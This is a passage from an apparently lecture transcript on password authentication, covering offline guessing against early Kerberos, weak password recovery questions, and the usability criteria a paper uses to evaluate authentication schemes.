            <slice>
              <time_slice>26:56</time_slice>
              <text_slice>PROFESSOR: Yeah, so--</text_slice>
            </slice>
            <slice>
              <time_slice>26:57</time_slice>
              <text_slice>AUDIENCE: That you
use in practice?</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>PROFESSOR: They do.</text_slice>
            </slice>
            <slice>
              <time_slice>27:01</time_slice>
              <text_slice>Those protocols
provides some stronger</text_slice>
            </slice>
            <slice>
              <time_slice>27:03</time_slice>
              <text_slice>cryptographic guarantees.</text_slice>
            </slice>
            <slice>
              <time_slice>27:05</time_slice>
              <text_slice>A lot of times they
are not backwards</text_slice>
            </slice>
            <slice>
              <time_slice>27:06</time_slice>
              <text_slice>compatible with current systems,
which is why in practice you</text_slice>
            </slice>
            <slice>
              <time_slice>27:08</time_slice>
              <text_slice>don't see them used a lot.</text_slice>
            </slice>
            <slice>
              <time_slice>27:09</time_slice>
              <text_slice>But yeah, there
are some protocols,</text_slice>
            </slice>
            <slice>
              <time_slice>27:10</time_slice>
              <text_slice>for example, that
allow the server to not</text_slice>
            </slice>
            <slice>
              <time_slice>27:14</time_slice>
              <text_slice>have any notion of
the password at all.</text_slice>
            </slice>
            <slice>
              <time_slice>27:17</time_slice>
              <text_slice>So there's some zero knowledge
type thing or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>27:20</time_slice>
              <text_slice>So those things do
work in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>27:21</time_slice>
              <text_slice>But one of the things that this
paper says is very interesting</text_slice>
            </slice>
            <slice>
              <time_slice>27:24</time_slice>
              <text_slice>is that you basically go
through all these authentication</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>schemes and they say,
OK, here's passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>27:29</time_slice>
              <text_slice>Yeah, they kind of suck.</text_slice>
            </slice>
            <slice>
              <time_slice>27:30</time_slice>
              <text_slice>Here's some other
things that are actually</text_slice>
            </slice>
            <slice>
              <time_slice>27:31</time_slice>
              <text_slice>much stronger on
security access,</text_slice>
            </slice>
            <slice>
              <time_slice>27:32</time_slice>
              <text_slice>but then they all fail on
deployability or usability</text_slice>
            </slice>
            <slice>
              <time_slice>27:35</time_slice>
              <text_slice>and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>27:36</time_slice>
              <text_slice>And so that's one of the
interesting and slightly sad</text_slice>
            </slice>
            <slice>
              <time_slice>27:39</time_slice>
              <text_slice>outcomes of this
paper that maybe</text_slice>
            </slice>
            <slice>
              <time_slice>27:41</time_slice>
              <text_slice>even though we have all
these much stronger security</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>for the protocols,
we can't deploy them</text_slice>
            </slice>
            <slice>
              <time_slice>27:46</time_slice>
              <text_slice>for some usability reasons
or some [INAUDIBLE] reason.</text_slice>
            </slice>
            <slice>
              <time_slice>27:54</time_slice>
              <text_slice>So that's just a fun
site to go to right.</text_slice>
            </slice>
            <slice>
              <time_slice>27:56</time_slice>
              <text_slice>So they claim that they
don't store your passwords</text_slice>
            </slice>
            <slice>
              <time_slice>27:58</time_slice>
              <text_slice>so you take them at their
word if you want to.</text_slice>
            </slice>
            <slice>
              <time_slice>28:00</time_slice>
              <text_slice>But it is very interesting to
just sit down and think like,</text_slice>
            </slice>
            <slice>
              <time_slice>28:03</time_slice>
              <text_slice>what password I generate?</text_slice>
            </slice>
            <slice>
              <time_slice>28:04</time_slice>
              <text_slice>And then type into this,
and see how accurate</text_slice>
            </slice>
            <slice>
              <time_slice>28:07</time_slice>
              <text_slice>it is in guessing what
the next thing will be.</text_slice>
            </slice>
            <slice>
              <time_slice>28:09</time_slice>
              <text_slice>It even covers things
like the popular heuristic</text_slice>
            </slice>
            <slice>
              <time_slice>28:12</time_slice>
              <text_slice>like take a popular phrase
that has multiple words,</text_slice>
            </slice>
            <slice>
              <time_slice>28:15</time_slice>
              <text_slice>and then only take the
first letter of each word.</text_slice>
            </slice>
            <slice>
              <time_slice>28:18</time_slice>
              <text_slice>So this thing is
very, very good.</text_slice>
            </slice>
            <slice>
              <time_slice>28:19</time_slice>
              <text_slice>Very, very scary too.</text_slice>
            </slice>
            <slice>
              <time_slice>28:21</time_slice>
              <text_slice>OK so that's Telepathwords.</text_slice>
            </slice>
            <slice>
              <time_slice>28:23</time_slice>
              <text_slice>And so one thing that
is also interesting</text_slice>
            </slice>
            <slice>
              <time_slice>28:25</time_slice>
              <text_slice>when you think about is
in your password scheme,</text_slice>
            </slice>
            <slice>
              <time_slice>28:30</time_slice>
              <text_slice>is it vulnerable to
offline guessing.</text_slice>
            </slice>
            <slice>
              <time_slice>28:37</time_slice>
              <text_slice>So this was a problem
that Kerberos before that.</text_slice>
            </slice>
            <slice>
              <time_slice>28:43</time_slice>
              <text_slice>And then also V5 without
this thing they call preauth.</text_slice>
            </slice>
            <slice>
              <time_slice>28:51</time_slice>
              <text_slice>So the basic idea is that in
these versions of Kerberos,</text_slice>
            </slice>
            <slice>
              <time_slice>28:55</time_slice>
              <text_slice>anyone could ask the KDC for
a ticket that would encrypted</text_slice>
            </slice>
            <slice>
              <time_slice>28:58</time_slice>
              <text_slice>with the users password.</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>So basically, the KDC did
not authenticate requests</text_slice>
            </slice>
            <slice>
              <time_slice>29:04</time_slice>
              <text_slice>that were coming from a client.</text_slice>
            </slice>
            <slice>
              <time_slice>29:05</time_slice>
              <text_slice>Now the thing that
the KDC would return</text_slice>
            </slice>
            <slice>
              <time_slice>29:07</time_slice>
              <text_slice>was, in fact-- there
are some set of bits</text_slice>
            </slice>
            <slice>
              <time_slice>29:12</time_slice>
              <text_slice>here that the KDC would return.</text_slice>
            </slice>
            <slice>
              <time_slice>29:13</time_slice>
              <text_slice>I'm sure you don't want to
think about this ugly set</text_slice>
            </slice>
            <slice>
              <time_slice>29:16</time_slice>
              <text_slice>of cryptographic
printers anymore.</text_slice>
            </slice>
            <slice>
              <time_slice>29:17</time_slice>
              <text_slice>But suffice it to
say, the KDC would</text_slice>
            </slice>
            <slice>
              <time_slice>29:18</time_slice>
              <text_slice>return this stuff
that was encrypted</text_slice>
            </slice>
            <slice>
              <time_slice>29:21</time_slice>
              <text_slice>with the key of the client.</text_slice>
            </slice>
            <slice>
              <time_slice>29:24</time_slice>
              <text_slice>That's what will come
back to the client side.</text_slice>
            </slice>
            <slice>
              <time_slice>29:26</time_slice>
              <text_slice>So the problem with this is
that because the server did not</text_slice>
            </slice>
            <slice>
              <time_slice>29:30</time_slice>
              <text_slice>check who was sending this
encrypted set of things to,</text_slice>
            </slice>
            <slice>
              <time_slice>29:34</time_slice>
              <text_slice>the attacker can basically
get this thing here and then</text_slice>
            </slice>
            <slice>
              <time_slice>29:38</time_slice>
              <text_slice>try to just guess what KC is.</text_slice>
            </slice>
            <slice>
              <time_slice>29:40</time_slice>
              <text_slice>Just guess that KC is some
value, try to encrypt this,</text_slice>
            </slice>
            <slice>
              <time_slice>29:43</time_slice>
              <text_slice>see if it looks reasonable.</text_slice>
            </slice>
            <slice>
              <time_slice>29:44</time_slice>
              <text_slice>If not, try to guess
another KC, decrypt this,</text_slice>
            </slice>
            <slice>
              <time_slice>29:47</time_slice>
              <text_slice>see if it looks reasonable.</text_slice>
            </slice>
            <slice>
              <time_slice>29:48</time_slice>
              <text_slice>And the reason why the attacker
can launch this type of attack,</text_slice>
            </slice>
            <slice>
              <time_slice>29:52</time_slice>
              <text_slice>is that this thing
here, this TGT actually</text_slice>
            </slice>
            <slice>
              <time_slice>29:54</time_slice>
              <text_slice>has a known format.</text_slice>
            </slice>
            <slice>
              <time_slice>29:57</time_slice>
              <text_slice>So it has things in
here like timestamps,</text_slice>
            </slice>
            <slice>
              <time_slice>29:59</time_slice>
              <text_slice>and it has things in here like
various link field would have</text_slice>
            </slice>
            <slice>
              <time_slice>30:02</time_slice>
              <text_slice>to be internally consistent.</text_slice>
            </slice>
            <slice>
              <time_slice>30:03</time_slice>
              <text_slice>And so that basically
helps the attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>30:06</time_slice>
              <text_slice>Because if the attacker guesses
the KC, gets this thing here,</text_slice>
            </slice>
            <slice>
              <time_slice>30:10</time_slice>
              <text_slice>a decrypted thing, and
the internal fields</text_slice>
            </slice>
            <slice>
              <time_slice>30:12</time_slice>
              <text_slice>don't check out,
the attacker knows</text_slice>
            </slice>
            <slice>
              <time_slice>30:14</time_slice>
              <text_slice>that it picked the
wrong KC, so they</text_slice>
            </slice>
            <slice>
              <time_slice>30:16</time_slice>
              <text_slice>can go on and pick another KC.</text_slice>
            </slice>
            <slice>
              <time_slice>30:18</time_slice>
              <text_slice>And so, in Kerberos V5,
basically the client</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>has to send in this thing
that it sends over to the KDC,</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>it basically sends a time stamp.</text_slice>
            </slice>
            <slice>
              <time_slice>30:36</time_slice>
              <text_slice>And then this time stamp is
going to be encrypted with KC.</text_slice>
            </slice>
            <slice>
              <time_slice>30:40</time_slice>
              <text_slice>So this is sent to the
server, and the server</text_slice>
            </slice>
            <slice>
              <time_slice>30:43</time_slice>
              <text_slice>looks at this and validates that
before it will send something</text_slice>
            </slice>
            <slice>
              <time_slice>30:46</time_slice>
              <text_slice>back to the client.</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>So that gets rid of this
problem that any random client</text_slice>
            </slice>
            <slice>
              <time_slice>30:49</time_slice>
              <text_slice>can show up and just
ask for this thing here.</text_slice>
            </slice>
            <slice>
              <time_slice>30:56</time_slice>
              <text_slice>AUDIENCE: So is time stamp
recorded in the message?</text_slice>
            </slice>
            <slice>
              <time_slice>31:00</time_slice>
              <text_slice>So can't the attacker just give
this message and enforce it?</text_slice>
            </slice>
            <slice>
              <time_slice>31:04</time_slice>
              <text_slice>PROFESSOR: Let's see here.</text_slice>
            </slice>
            <slice>
              <time_slice>31:05</time_slice>
              <text_slice>So can't the attacker
get this message here?</text_slice>
            </slice>
            <slice>
              <time_slice>31:09</time_slice>
              <text_slice>AUDIENCE: Yeah, the
encryption [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>31:11</time_slice>
              <text_slice>PROFESSOR: So you're thinking
where the attacker might just</text_slice>
            </slice>
            <slice>
              <time_slice>31:14</time_slice>
              <text_slice>spoof this, for example?</text_slice>
            </slice>
            <slice>
              <time_slice>31:15</time_slice>
              <text_slice>AUDIENCE: No, I just brute
force it and get KC out.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>PROFESSOR: OK.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>So in other words,
you're worried</text_slice>
            </slice>
            <slice>
              <time_slice>31:21</time_slice>
              <text_slice>someone could observe this.</text_slice>
            </slice>
            <slice>
              <time_slice>31:22</time_slice>
              <text_slice>AUDIENCE: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>31:23</time_slice>
              <text_slice>PROFESSOR: So I
believe that this</text_slice>
            </slice>
            <slice>
              <time_slice>31:25</time_slice>
              <text_slice>is put inside an encrypted thing
that belongs to the server,</text_slice>
            </slice>
            <slice>
              <time_slice>31:29</time_slice>
              <text_slice>or the key belongs
to the server.</text_slice>
            </slice>
            <slice>
              <time_slice>31:30</time_slice>
              <text_slice>I think to prevent that
attack. [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>31:32</time_slice>
              <text_slice>so don't quote me on that.</text_slice>
            </slice>
            <slice>
              <time_slice>31:34</time_slice>
              <text_slice>But you're correct
it's not, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>31:36</time_slice>
              <text_slice>And if the attacker,
for example,</text_slice>
            </slice>
            <slice>
              <time_slice>31:37</time_slice>
              <text_slice>knew something that about
what the current time is,</text_slice>
            </slice>
            <slice>
              <time_slice>31:39</time_slice>
              <text_slice>roughly, that actually
is super useful.</text_slice>
            </slice>
            <slice>
              <time_slice>31:42</time_slice>
              <text_slice>Because then the
attacker can guess,</text_slice>
            </slice>
            <slice>
              <time_slice>31:44</time_slice>
              <text_slice>oh, time stamp should be
roughly between here and here.</text_slice>
            </slice>
            <slice>
              <time_slice>31:46</time_slice>
              <text_slice>And if it sees
it's in the clear,</text_slice>
            </slice>
            <slice>
              <time_slice>31:48</time_slice>
              <text_slice>it can do the exact same
attack that we had up here.</text_slice>
            </slice>
            <slice>
              <time_slice>31:50</time_slice>
              <text_slice>AUDIENCE: It's a little better
because the attacker has</text_slice>
            </slice>
            <slice>
              <time_slice>31:52</time_slice>
              <text_slice>to be in the middle, but
it's still susceptible.</text_slice>
            </slice>
            <slice>
              <time_slice>31:54</time_slice>
              <text_slice>PROFESSOR: That's true.</text_slice>
            </slice>
            <slice>
              <time_slice>31:55</time_slice>
              <text_slice>Well, yeah, that's
right, the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>31:57</time_slice>
              <text_slice>has to be on the
network somewhere so</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>this [INAUDIBLE] stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>32:00</time_slice>
              <text_slice>That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>32:04</time_slice>
              <text_slice>So that's all, I'm guessing.</text_slice>
            </slice>
            <slice>
              <time_slice>32:06</time_slice>
              <text_slice>So another thing that's
important to think about</text_slice>
            </slice>
            <slice>
              <time_slice>32:09</time_slice>
              <text_slice>is password recovery.</text_slice>
            </slice>
            <slice>
              <time_slice>32:18</time_slice>
              <text_slice>So this is the idea that
you lose your password,</text_slice>
            </slice>
            <slice>
              <time_slice>32:20</time_slice>
              <text_slice>and then somehow you
have to go to the service</text_slice>
            </slice>
            <slice>
              <time_slice>32:23</time_slice>
              <text_slice>and you have to ask
for another password.</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>But before you
get that password,</text_slice>
            </slice>
            <slice>
              <time_slice>32:28</time_slice>
              <text_slice>you have to prove that
you are you in some way.</text_slice>
            </slice>
            <slice>
              <time_slice>32:30</time_slice>
              <text_slice>So how does that work?</text_slice>
            </slice>
            <slice>
              <time_slice>32:31</time_slice>
              <text_slice>How to do password recovery?</text_slice>
            </slice>
            <slice>
              <time_slice>32:32</time_slice>
              <text_slice>So what's interesting is
that people oftentimes</text_slice>
            </slice>
            <slice>
              <time_slice>32:35</time_slice>
              <text_slice>focus on the entropy
of the password itself.</text_slice>
            </slice>
            <slice>
              <time_slice>32:39</time_slice>
              <text_slice>But the problem is that
if the password recovery</text_slice>
            </slice>
            <slice>
              <time_slice>32:43</time_slice>
              <text_slice>questions or the
password recovery scheme</text_slice>
            </slice>
            <slice>
              <time_slice>32:45</time_slice>
              <text_slice>has little entropy,
that actually</text_slice>
            </slice>
            <slice>
              <time_slice>32:47</time_slice>
              <text_slice>affects the entropy of the
overall authentication scheme.</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>So in other words, the
strength of the overall scheme</text_slice>
            </slice>
            <slice>
              <time_slice>32:55</time_slice>
              <text_slice>is basically equal
to the minimum</text_slice>
            </slice>
            <slice>
              <time_slice>32:58</time_slice>
              <text_slice>of the password entropy in
the recovery question entropy.</text_slice>
            </slice>
            <slice>
              <time_slice>33:11</time_slice>
              <text_slice>And so you see this
actually play out</text_slice>
            </slice>
            <slice>
              <time_slice>33:13</time_slice>
              <text_slice>in a lot of rules scenarios.</text_slice>
            </slice>
            <slice>
              <time_slice>33:16</time_slice>
              <text_slice>There's a lot of famous cases,
like the Sarah Palin case,</text_slice>
            </slice>
            <slice>
              <time_slice>33:18</time_slice>
              <text_slice>where basically someone
was able to recover</text_slice>
            </slice>
            <slice>
              <time_slice>33:21</time_slice>
              <text_slice>her password fraudulently
because her recovery</text_slice>
            </slice>
            <slice>
              <time_slice>33:25</time_slice>
              <text_slice>questions were things that
any random person could find.</text_slice>
            </slice>
            <slice>
              <time_slice>33:28</time_slice>
              <text_slice>By looking at her Wikipedia
article, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>33:30</time_slice>
              <text_slice>find out where she went to high
school and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:32</time_slice>
              <text_slice>And so often times these
password recovery questions</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>are not very good.</text_slice>
            </slice>
            <slice>
              <time_slice>33:36</time_slice>
              <text_slice>And they're not very good
because of a couple reasons.</text_slice>
            </slice>
            <slice>
              <time_slice>33:39</time_slice>
              <text_slice>So sometimes these things
just have very low entropy.</text_slice>
            </slice>
            <slice>
              <time_slice>33:44</time_slice>
              <text_slice>So if you have a password
recovery question that</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>is something like, what's
your favorite color,</text_slice>
            </slice>
            <slice>
              <time_slice>33:49</time_slice>
              <text_slice>the most popular answers are
going to be like blue and red.</text_slice>
            </slice>
            <slice>
              <time_slice>33:52</time_slice>
              <text_slice>Nobody's going to say like
off white, fuchsia, magenta.</text_slice>
            </slice>
            <slice>
              <time_slice>33:55</time_slice>
              <text_slice>So some of these
recovery questions</text_slice>
            </slice>
            <slice>
              <time_slice>33:57</time_slice>
              <text_slice>intrinsically are very difficult
to provide a lot of entropy</text_slice>
            </slice>
            <slice>
              <time_slice>34:01</time_slice>
              <text_slice>for.</text_slice>
            </slice>
            <slice>
              <time_slice>34:01</time_slice>
              <text_slice>The other problem is
that sometimes these</text_slice>
            </slice>
            <slice>
              <time_slice>34:05</time_slice>
              <text_slice>recover questions can be
leaked via social media.</text_slice>
            </slice>
            <slice>
              <time_slice>34:11</time_slice>
              <text_slice>So for example, if one
of the recovery questions</text_slice>
            </slice>
            <slice>
              <time_slice>34:14</time_slice>
              <text_slice>is what's your favorite movie?</text_slice>
            </slice>
            <slice>
              <time_slice>34:16</time_slice>
              <text_slice>So maybe this space there
is a little bit bigger,</text_slice>
            </slice>
            <slice>
              <time_slice>34:18</time_slice>
              <text_slice>but if intrinsically I
can go look at, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>34:20</time_slice>
              <text_slice>your IMDB profile,
your Facebook profile,</text_slice>
            </slice>
            <slice>
              <time_slice>34:22</time_slice>
              <text_slice>and figure out like,
oh hey, you literally</text_slice>
            </slice>
            <slice>
              <time_slice>34:24</time_slice>
              <text_slice>told me that's your
favorite movie,</text_slice>
            </slice>
            <slice>
              <time_slice>34:25</time_slice>
              <text_slice>this isn't super useful either.</text_slice>
            </slice>
            <slice>
              <time_slice>34:27</time_slice>
              <text_slice>And another problem--
this is actually</text_slice>
            </slice>
            <slice>
              <time_slice>34:29</time_slice>
              <text_slice>sort of the funniest
one-- is that the user</text_slice>
            </slice>
            <slice>
              <time_slice>34:32</time_slice>
              <text_slice>selected recovery questions
are often super weak.</text_slice>
            </slice>
            <slice>
              <time_slice>34:38</time_slice>
              <text_slice>So for example, people
have done a survey</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>of what some of these
recovery questions look like,</text_slice>
            </slice>
            <slice>
              <time_slice>34:44</time_slice>
              <text_slice>and sometimes users
themselves will</text_slice>
            </slice>
            <slice>
              <time_slice>34:46</time_slice>
              <text_slice>set recovery questions that are
things like what is 2 plus 3?</text_slice>
            </slice>
            <slice>
              <time_slice>34:51</time_slice>
              <text_slice>And so, at the time, the user's
thinking this is a big hassle,</text_slice>
            </slice>
            <slice>
              <time_slice>34:55</time_slice>
              <text_slice>we're going to have to use this.</text_slice>
            </slice>
            <slice>
              <time_slice>34:56</time_slice>
              <text_slice>But trivially most humans
who pass the Turing Test</text_slice>
            </slice>
            <slice>
              <time_slice>34:59</time_slice>
              <text_slice>can answer that
questions successfully.</text_slice>
            </slice>
            <slice>
              <time_slice>35:01</time_slice>
              <text_slice>And then therefore get
the users password back.</text_slice>
            </slice>
            <slice>
              <time_slice>35:04</time_slice>
              <text_slice>AUDIENCE: So [INAUDIBLE] like
using recovery passwords?</text_slice>
            </slice>
            <slice>
              <time_slice>35:12</time_slice>
              <text_slice>It's basically like you enter in
your name and maybe the subject</text_slice>
            </slice>
            <slice>
              <time_slice>35:16</time_slice>
              <text_slice>of some emails that you've
sent, like a small amount</text_slice>
            </slice>
            <slice>
              <time_slice>35:18</time_slice>
              <text_slice>of additional information.</text_slice>
            </slice>
            <slice>
              <time_slice>35:19</time_slice>
              <text_slice>But based on that,
in some cases they</text_slice>
            </slice>
            <slice>
              <time_slice>35:21</time_slice>
              <text_slice>can-- is security of
that kind of stuff then?</text_slice>
            </slice>
            <slice>
              <time_slice>35:26</time_slice>
              <text_slice>PROFESSOR: So I don't know of
any formal study like that.</text_slice>
            </slice>
            <slice>
              <time_slice>35:28</time_slice>
              <text_slice>Those things are
actually a lot better.</text_slice>
            </slice>
            <slice>
              <time_slice>35:30</time_slice>
              <text_slice>I actually know
this, because I was</text_slice>
            </slice>
            <slice>
              <time_slice>35:32</time_slice>
              <text_slice>trying to help a friend
go through this process.</text_slice>
            </slice>
            <slice>
              <time_slice>35:35</time_slice>
              <text_slice>So she basically lost
control of her Gmail account,</text_slice>
            </slice>
            <slice>
              <time_slice>35:38</time_slice>
              <text_slice>and she was trying to prove
that this was her account.</text_slice>
            </slice>
            <slice>
              <time_slice>35:40</time_slice>
              <text_slice>And so yeah, they would ask you
things like roughly speaking,</text_slice>
            </slice>
            <slice>
              <time_slice>35:43</time_slice>
              <text_slice>when did you open this account.</text_slice>
            </slice>
            <slice>
              <time_slice>35:46</time_slice>
              <text_slice>Roughly speaking before you
lost control of this account</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>to hesball or whatever,
who were some of the people</text_slice>
            </slice>
            <slice>
              <time_slice>35:52</time_slice>
              <text_slice>that you talked to?</text_slice>
            </slice>
            <slice>
              <time_slice>35:54</time_slice>
              <text_slice>And things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>35:55</time_slice>
              <text_slice>And it's actually a
pretty laborious process.</text_slice>
            </slice>
            <slice>
              <time_slice>35:57</time_slice>
              <text_slice>What ends up happening is
that you're generally correct,</text_slice>
            </slice>
            <slice>
              <time_slice>35:59</time_slice>
              <text_slice>it ends up being much more
powerful than this stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>36:01</time_slice>
              <text_slice>And so actually I don't know
of any formal studies of that,</text_slice>
            </slice>
            <slice>
              <time_slice>36:04</time_slice>
              <text_slice>but it does seem
[INAUDIBLE] much strong</text_slice>
            </slice>
            <slice>
              <time_slice>36:06</time_slice>
              <text_slice>than these types of things.</text_slice>
            </slice>
            <slice>
              <time_slice>36:11</time_slice>
              <text_slice>All right, any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>36:16</time_slice>
              <text_slice>Now we can get to
the paper for today.</text_slice>
            </slice>
            <slice>
              <time_slice>36:20</time_slice>
              <text_slice>So reading for today,
the author has basically</text_slice>
            </slice>
            <slice>
              <time_slice>36:24</time_slice>
              <text_slice>proposed a bunch of factors
that can be used to evaluate</text_slice>
            </slice>
            <slice>
              <time_slice>36:28</time_slice>
              <text_slice>these authentication schemes.</text_slice>
            </slice>
            <slice>
              <time_slice>36:30</time_slice>
              <text_slice>And what's really cool
about this paper, I think,</text_slice>
            </slice>
            <slice>
              <time_slice>36:32</time_slice>
              <text_slice>is that it basically tries
to say, look, a lot of us</text_slice>
            </slice>
            <slice>
              <time_slice>36:35</time_slice>
              <text_slice>in the security community
are fighting just</text_slice>
            </slice>
            <slice>
              <time_slice>36:37</time_slice>
              <text_slice>based on aesthetic principles.</text_slice>
            </slice>
            <slice>
              <time_slice>36:38</time_slice>
              <text_slice>Like, we should pick
this because I just</text_slice>
            </slice>
            <slice>
              <time_slice>36:41</time_slice>
              <text_slice>like the way that the curly
braces look in the proof.</text_slice>
            </slice>
            <slice>
              <time_slice>36:43</time_slice>
              <text_slice>We should pick this because
it uses a lot of math mode.</text_slice>
            </slice>
            <slice>
              <time_slice>36:46</time_slice>
              <text_slice>And so what they say is, look,
why don't we try to establish</text_slice>
            </slice>
            <slice>
              <time_slice>36:48</time_slice>
              <text_slice>some type of criteria?</text_slice>
            </slice>
            <slice>
              <time_slice>36:50</time_slice>
              <text_slice>Maybe some of the criteria
are a little bit subjective.</text_slice>
            </slice>
            <slice>
              <time_slice>36:52</time_slice>
              <text_slice>Let's just try to have
this taxonomy of ways</text_slice>
            </slice>
            <slice>
              <time_slice>36:54</time_slice>
              <text_slice>to evaluate the
authentication scheme.</text_slice>
            </slice>
            <slice>
              <time_slice>36:56</time_slice>
              <text_slice>And let's just see how these
various schemes stack up.</text_slice>
            </slice>
            <slice>
              <time_slice>36:59</time_slice>
              <text_slice>And so the authors basically
proposed three high level</text_slice>
            </slice>
            <slice>
              <time_slice>37:03</time_slice>
              <text_slice>metrics for evaluating
these schemes.</text_slice>
            </slice>
            <slice>
              <time_slice>37:05</time_slice>
              <text_slice>And so, the first
metric is usability.</text_slice>
            </slice>
            <slice>
              <time_slice>37:11</time_slice>
              <text_slice>And so, the base
idea here is how</text_slice>
            </slice>
            <slice>
              <time_slice>37:13</time_slice>
              <text_slice>easy is it for users to interact
with this authentication</text_slice>
            </slice>
            <slice>
              <time_slice>37:16</time_slice>
              <text_slice>scheme.</text_slice>
            </slice>
            <slice>
              <time_slice>37:17</time_slice>
              <text_slice>So they find a couple
interesting properties.</text_slice>
            </slice>
            <slice>
              <time_slice>37:20</time_slice>
              <text_slice>So for example, is
it easy to learn?</text_slice>
            </slice>
            <slice>
              <time_slice>37:26</time_slice>
              <text_slice>This basically just means is
this scheme easy to learn?</text_slice>
            </slice>
            <slice>
              <time_slice>37:29</time_slice>
              <text_slice>So some of these categories
are pretty straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>37:31</time_slice>
              <text_slice>Some of them actually involve
a little bit of subtlety.</text_slice>
            </slice>
            <slice>
              <time_slice>37:33</time_slice>
              <text_slice>But this one makes
a lot of sense.</text_slice>
            </slice>
            <slice>
              <time_slice>37:35</time_slice>
              <text_slice>And so if we look at passwords,
passwords pass this test.</text_slice>
            </slice>
            <slice>
              <time_slice>37:43</time_slice>
              <text_slice>Because everybody is used to
using passwords, so we'll say</text_slice>
            </slice>
            <slice>
              <time_slice>37:48</time_slice>
              <text_slice>they are easy to learn.</text_slice>
            </slice>
            <slice>
              <time_slice>37:49</time_slice>
              <text_slice>Another category is
infrequent errors.</text_slice>
            </slice>
            <slice>
              <time_slice>37:54</time_slice>
              <text_slice>So that means when
you are trying</text_slice>
            </slice>
            <slice>
              <time_slice>37:56</time_slice>
              <text_slice>to authenticate
the system, if you</text_slice>
            </slice>
            <slice>
              <time_slice>37:58</time_slice>
              <text_slice>are the actual user
in question, is it</text_slice>
            </slice>
            <slice>
              <time_slice>38:01</time_slice>
              <text_slice>the case that you can
often authenticate yourself</text_slice>
            </slice>
            <slice>
              <time_slice>38:03</time_slice>
              <text_slice>without generating errors?</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>And so, here the
authors say quasi-yes.</text_slice>
            </slice>
            <slice>
              <time_slice>38:12</time_slice>
              <text_slice>And so the quasi prefix is
one of the more entertaining</text_slice>
            </slice>
            <slice>
              <time_slice>38:15</time_slice>
              <text_slice>aspects of the paper,
because authors kind of</text_slice>
            </slice>
            <slice>
              <time_slice>38:17</time_slice>
              <text_slice>admit there's this element
of subjectivity to it.</text_slice>
            </slice>
            <slice>
              <time_slice>38:20</time_slice>
              <text_slice>So we can't necessarily say with
crisp precision yes, no, things</text_slice>
            </slice>
            <slice>
              <time_slice>38:24</time_slice>
              <text_slice>like this.</text_slice>
            </slice>
            <slice>
              <time_slice>38:25</time_slice>
              <text_slice>So the reason why
they say quasi-yes</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>is because, in general, you
can authenticate a password</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>successfully.</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>But we've all been in that
place where it's like 3 AM,</text_slice>
            </slice>
            <slice>
              <time_slice>38:33</time_slice>
              <text_slice>we're trying to log on
to our email server,</text_slice>
            </slice>
            <slice>
              <time_slice>38:34</time_slice>
              <text_slice>our mind's not in
the right place,</text_slice>
            </slice>
            <slice>
              <time_slice>38:36</time_slice>
              <text_slice>and we enter a bunch of
errors a bunch of times.</text_slice>
            </slice>
            <slice>
              <time_slice>38:38</time_slice>
              <text_slice>So they say quasi-yes for this.</text_slice>
            </slice>
            <slice>
              <time_slice>38:41</time_slice>
              <text_slice>Another category is
it scalable for users.</text_slice>
            </slice>
            <slice>
              <time_slice>38:50</time_slice>
              <text_slice>And so the basic idea
here is if the user has</text_slice>
            </slice>
            <slice>
              <time_slice>38:54</time_slice>
              <text_slice>a bunch of different
services that he or she wants</text_slice>
            </slice>
            <slice>
              <time_slice>38:56</time_slice>
              <text_slice>to authenticate to, does
this scheme scale well?</text_slice>
            </slice>
            <slice>
              <time_slice>39:01</time_slice>
              <text_slice>Does the user have to
remember some new thing</text_slice>
            </slice>
            <slice>
              <time_slice>39:04</time_slice>
              <text_slice>for each one of the schemes?</text_slice>
            </slice>
            <slice>
              <time_slice>39:06</time_slice>
              <text_slice>And so, for here,
the authors say no.</text_slice>
            </slice>
            <slice>
              <time_slice>39:11</time_slice>
              <text_slice>Because in practice, it's
very difficult for users</text_slice>
            </slice>
            <slice>
              <time_slice>39:14</time_slice>
              <text_slice>to remember a separate
password for every single site</text_slice>
